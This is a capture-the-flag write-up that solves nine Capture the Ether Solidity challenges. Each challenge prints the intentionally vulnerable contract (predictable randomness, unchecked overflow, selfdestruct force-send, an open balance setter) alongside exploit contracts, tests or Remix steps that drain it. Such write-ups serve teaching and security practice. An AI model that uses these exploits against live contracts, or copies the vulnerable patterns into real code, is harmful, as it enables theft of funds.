Below, you'll find solutions to all challenges of [RareSkills' Capture the Ether fork](https://github.com/RareSkills/capture-the-ether-foundry).

# 1. Guess the Secret Number

## Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessTheSecretNumber {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable returns (bool) {
        require(msg.value == 1 ether);

        if (keccak256(abi.encodePacked(n)) == answerHash) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to Send 2 ether");
        }
        return true;
    }
}
```

## Solution

Note that `n` is of data type `uint8`, i.e., the number we're looking for must be an unsigned integer between 0 and 255. Since the set of possible solutions is so small, we can easily brute-force the solution either on-chain or off-chain.

The code below demonstrates how to solve this challenge on-chain:

_GetSecretNumber.sol_

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessTheSecretNumber {
    ...
}

contract ExploitContract {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    function Exploiter() public view returns (uint8) {
        uint8 n;
        for (uint8 i; i < 255; i++) {
            if (keccak256(abi.encodePacked(i)) == answerHash) {
                n = i;
            }
        }
        return n;
    }
}

```

_GetSecretNumber.t.sol_

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GuessSecretNumber.sol";

contract GuessSecretNumberTest is Test {
    ExploitContract exploitContract;
    GuessTheSecretNumber guessTheSecretNumber;

    function setUp() public {
        // Deploy "GuessTheSecretNumber" contract and deposit one ether into it
        guessTheSecretNumber = (new GuessTheSecretNumber){value: 1 ether}();

        // Deploy "ExploitContract"
        exploitContract = new ExploitContract();
    }

    function testFindSecretNumber() public {
        uint8 secretNumber = exploitContract.Exploiter();
        _checkSolved(secretNumber);
    }

    function _checkSolved(uint8 _secretNumber) internal {
        assertTrue(guessTheSecretNumber.guess{value: 1 ether}(_secretNumber), "Wrong Number");
        assertTrue(guessTheSecretNumber.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
```

# 2. Guess the Random Number

## Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessRandomNumber {
    uint8 answer;

    constructor() payable {
        require(msg.value == 1 ether);
        answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Fail to send to msg.sender");
        }
    }
}
```

## Solution

Note that the "random" number is generated based on known block parameters such as the previous block's hash and the current block's timestamp.
Therefore, we can simply replicate the "random" number by using the very same generation code in our exploit:

```solidity
contract ExploitContract {
    GuessRandomNumber public guessRandomNumber;
    uint8 public answer;

    function Exploit() public returns (uint8) {
        answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        return answer;
    }
}
```

# 3. Guess the New Number

## Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessNewNumber {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable returns (bool pass) {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        if (n == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Fail to send to msg.sender");
            pass = true;
        }
    }
}
```

## Solution

Since both `blockhash(block.number - 1)` and `block.timestamp` can also be accessed by an attacker contract, we can reproduce `answer` inside an attacker contract using the exact same code:

_GetNewNumber.sol_

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessNewNumber {
    ...
}

contract ExploitContract {
    GuessNewNumber public guessNewNumber;
    uint8 public answer;

    function Exploit() public returns (uint8) {
        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        return answer;
    }
}
```

_GetNewNumber.t.sol_

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GuessNewNumber.sol";

contract GuessNewNumberTest is Test {
    GuessNewNumber public guessNewNumber;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        guessNewNumber = (new GuessNewNumber){value: 1 ether}();
        exploitContract = new ExploitContract();
    }

    function testNumber(uint256 blockNumber, uint256 blockTimestamp) public {
        // Prevent zero inputs
        vm.assume(blockNumber != 0);
        vm.assume(blockTimestamp != 0);
        // Set block number and timestamp
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // Place your solution here
        uint8 answer = exploitContract.Exploit();
        _checkSolved(answer);
    }

    function _checkSolved(uint8 _newNumber) internal {
        assertTrue(guessNewNumber.guess{value: 1 ether}(_newNumber), "Wrong Number");
        assertTrue(guessNewNumber.isComplete(), "Balance is supposed to be zero");
    }

    receive() external payable {}
}
```

# 4. Predict the Future

## Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}
```

## Solution

Note that `answer` has to be an integer between 0 and 9 because it is computed modulo 10. Therefore, we can lock in any guess, e.g., 0, and spam the contract by calling `settle` multiple times across multiple blocks. Notice that because `settle` will reset `guesser` to the zero address, we need to ensure the transaction reverts if we guessed wrong. (Otherwise, we'd be required to always call `lockInGuess` before calling `settle`. In particular, we'd be required to pay 1 ether for each attempt, making our spamming strategy unprofitable.)

We can conveniently execute this attack in Remix using the attacker contract below.

NOTE: `lockInGuess` must be called via the attacker contract to pass `require(msg.sender == guesser)` during settlement.

```solidity
//SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.13;

import "./PredictTheFuture.sol";

contract ExploitContract {
    PredictTheFuture public predictTheFuture;

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    receive() external payable {}

    function lockInGuess() external payable {
        predictTheFuture.lockInGuess{value: 1 ether}(0);
    }

    function attack() external {
        predictTheFuture.settle();
        require(predictTheFuture.isComplete(), "Exploit failed");
    }
}
```

# 5. Predict the Block Hash

## Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

//Challenge
contract PredictTheBlockhash {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to create this contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0), "Requires guesser to be zero address");
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "Requires msg.sender to be guesser");
        require(block.number > settlementBlockNumber, "Requires block.number to be more than settlementBlockNumber");

        bytes32 answer = blockhash(settlementBlockNumber);

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }
}
```

## Solution

To exploit this contract, it's important to know that `blockhash` only returns the actual block hash for the last 256 blocks due to performance reasons. For any blocks that lie further in the past, `blockhash` will return `0x0000000000000000000000000000000000000000000000000000000000000000`.

Therefore, we can call `lockInGuess` with `hash = 0x0000000000000000000000000000000000000000000000000000000000000000`, wait until the corresponding block lies far enough in the past, and finally call `settle`.

_PredictTheBlockhash.t.sol_

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;

    function setUp() public {
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
    }

    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number;

        // Put your solution here
        predictTheBlockhash.lockInGuess{value: 1 ether}(
            0x0000000000000000000000000000000000000000000000000000000000000000
        );

        vm.roll(blockNumber + 258);
        predictTheBlockhash.settle();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
```

# 6. Token Sale

## Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total);

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}
```

## Solution

While this challenge is part of a Foundry repo, it can also be conveniently solved in Remix without the need to write any code.

To complete the challenge, we need to find a way to issue ourselves tokens either for free or at least at a discount so that we can sell the tokens back at the normal price for a profit.

First, observe that `buy` has an unchecked block, allowing `total` to overflow. So, our first idea could be to choose `numTokens` in such a way that `total == 0`. (In this case, we would trick the contract into issuing us tokens _for free_.) Note that, since we're working with `uint256`, we have: `0 == 2**256`. Hence, a `numTokens` value that would yield `total == 0` can be computed via `2**256 / PRICE_PER_TOKEN == 2**256 / 10**18`. However, doing so, e.g., with [WolframAlpha](https://www.wolframalpha.com/), we see that the exact result of this computation is _not_ an integer:

```
2**256 / 10**18 == 441711766194596082395824375185729628956870974218904739530401550323154944 / 3814697265625
```

Hence, we cannot use this value as our `numTokens` input parameter because `numTokens` has to be an unsigned integer.

We can, however, overflow `total` just enough so that `numTokens` can be specified as an integer. Sure, in this case, we don't get all our tokens for free, but we would get them at a huge discount.

More precisely, we want to find an `x` such that `2**256 + x == 0 mod 10**18`. If we solve this equation in WolframAlpha, we get `x == 415992086870360064`. Now, if we compute `(2**256 + 415992086870360064) / 10**18`, we get `115792089237316195423570985008687907853269984665640564039458` as the integer value that we can use for `numTokens` in order to overflow `total`.

In other words, if we call `buy` and specify `numTokens = 115792089237316195423570985008687907853269984665640564039458`, then we only need to pay 415992086870360064 wei (0.41599... ether) to get 115792089237316195423570985008687907853269984665640564039458 tokens in return!

After calling `buy` in this way, the contract's new balance is 1.415992086870360064 ether, i.e., it didn't even earn the price of a single token (1 ether) but issued an insane amount of tokens to us. We can subsequently call `sell` with `numTokens = 1` to earn 1 ether from the contract, resulting in a contract balance of 0.415992086870360064 ether (< 1 ether), which completes the challenge.

# 7. Token Whale

## Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _player) {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    function _transfer(address to, uint256 value) internal {
        unchecked {
            balanceOf[msg.sender] -= value;
            balanceOf[to] += value;
        }

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}
```

## Solution

This challenge is conveniently solved via Remix. To increase the `player`'s token balance to 1M (or more), we'll use two different accounts and perform the following sequence of function calls:

1. Set `_player` to an EOA you control, e.g., the first of Remix's default accounts. This will give `player` an account balance of 1000.
2. Next, approve a second EOA you control, e.g., the second of Remix's default accounts, with `value = 1`. Ensure to make this function call from `player`'s account.
3. Now, call `transferFrom(player, player, 1)` from the second EOA. At first sight, one would assume that this wouldn't change anything since we're just sending `value = 1` from the `player` to the `player`. However, by taking a closer look at the implementation of `_transfer`, we see that this call will underflow the second EOA's balance (and add 1 to the `player`'s balance). In other words, after this call, `player` has a balance of 1001 while the second EOA has a balance of `2**256 - 1`!
4. Lastly, we can use `transfer` to transfer `value = 998999` (or more) from the second EOA to `player`, leaving `player` with a balance of 1000000 (or more).

Note that the `to` argument in the above call to `transferFrom` can actually be chosen arbitrarily. The important point in the above sequence is not that we increase the `player`'s balance from 1000 to 1001, but that we underflow the balance of our second EOA so that this account has enough tokens to bump up `player`'s balance to 1M or more.

# 8. Retirement Fund

## Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract RetirementFund {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = block.timestamp + 520 weeks;

    constructor(address player) payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (block.timestamp < expiration) {
            // early withdrawal incurs a 10% penalty
            (bool ok, ) = msg.sender.call{
                value: (address(this).balance * 9) / 10
            }("");
            require(ok, "Transfer to msg.sender failed");
        } else {
            (bool ok, ) = msg.sender.call{value: address(this).balance}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);
        uint256 withdrawn = 0;
        unchecked {
            withdrawn += startBalance - address(this).balance;

            // an early withdrawal occurred
            require(withdrawn > 0);
        }

        // penalty is what's left
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer to msg.sender failed");
    }
}
```

## Solution

This challenge is conveniently solved via Remix. First, deploy the contract from Remix's default account. Set `player` to the address of that default account so that it becomes the `beneficiary`.

Next, observe that `collectPenalty` contains a vulnerable `unchecked` block. Suppose we can somehow achieve `startBalance < address(this).balance`. In that case, `withdrawn` will underflow, pass `require(withdrawn > 0)`, and, therefore, allow us to transfer the contract's entire balance to our account by calling `collectPenalty`.

Unfortunately, the contract does _not_ implement:

- a `fallback` function
- a `receive` function
- any `payable` functions (except the constructor which is restricted to receiving exactly 1 ether)

Therefore, one could naively assume that it is not possible to send any more ether to the contract to achieve `startBalance < address(this).balance`.

However, we can force-send ether by calling the `selfdestruct` instruction on another contract containing funds, and specifying the `RetirementFund` as the target!

Thus, we can carry out our attack as follows:

1. Deploy a second contract (see below) **with an initial balance of 1 wei**.
2. Call `forceSend`, specifying `RetirementFund`'s address as the target. This will lead to `startBalance < address(this).balance` on the `RetirementFund` contract since the new values will be `startBalance == 1 ether` and `address(this).balance == 1 ether + 1 wei`
3. Call `collectPenalty`. Because `startBalance < address(this).balance`, `withdrawn` will underflow, pass `require > 0`, and result in a transfer of the contract's entire balance to our account.

NOTE: At the time of writing, `selfdestruct` has been deprecated. The underlying opcode will eventually undergo breaking changes. Therefore, this solution might no longer be valid depending on when you're reading this.

```solidity
// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.0;

contract ForceSend {
    // This constructor is payable, allowing the contract to be deployed with 1 wei.
    constructor() payable {}

    // Function to force-send Ether to a target address.
    function forceSend(address payable target) external {
        // The selfdestruct function sends all remaining Ether and destroys the contract.
        selfdestruct(target);
    }
}
```

# 9. Token Bank

## Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes memory data) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint256 length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(address to, uint256 value, bytes memory data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;
    address public player;

    constructor(address _player) {
        token = new SimpleERC223Token();
        player = _player;
        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10 ** 18; // half for me
        balanceOf[player] = 500000 * 10 ** 18; // half for you
    }

    function addcontract(address _contract) public {
        balanceOf[_contract] = 500000 * 10 ** 18;
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(address(this)) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        unchecked {
            balanceOf[msg.sender] -= amount;
        }
    }
}
```

## Solution

I'm not sure whether this design is intentional, but the RareSkills challenge differs from the original Capture the Ether challenge. More specifically, the RareSkills version contains an additional function, `addcontract`, that can be used to drain the bank easily. The most convenient way to follow along is Remix.

After deployment, we have `token.balanceOf(address(this)) == 10**6 * 10**18`, where `address(this)` refers to the bank's address. To complete the challenge, we must reduce this balance to 0.

However, achieving that is straightforward by using the following sequence of actions:

1. Deploy `TokenBankChallenge` specifying the deployer's address as the `_player`.
2. Call `withdraw` from the deployer's account, specifying the amount to be `500_000_000_000_000_000_000_000`.
3. Call `addcontract`, specifying the deployer's address for the `_contract` parameter.
4. Call `withdraw` from the deployer's account, specifying the amount to be `500_000_000_000_000_000_000_000`.

Performing the above steps solves the challenge.

NOTE: The original Capture the Ether challenge does _not_ contain the `addcontract` function. However, notice that `withdraw` doesn't follow the checks-effects-interactions pattern and is, therefore, vulnerable to reentrancy. (Note that `transfer` calls `tokenFallback` on the receiver.) A detailed solution for this original case is explained in [Christoph Michel's Capture the Ether blog post](https://cmichel.io/capture-the-ether-solutions/).
